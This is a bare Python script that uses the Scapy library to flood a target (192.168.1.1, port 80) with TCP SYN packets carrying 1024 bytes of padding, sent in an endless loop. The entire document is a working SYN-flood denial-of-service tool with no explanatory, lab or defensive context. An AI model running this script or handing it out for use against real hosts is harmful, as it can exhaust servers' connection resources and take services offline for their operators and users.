from scapy.all import *

target_ip = "192.168.1.1"
target_port = 80

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop=1, verbose=0)


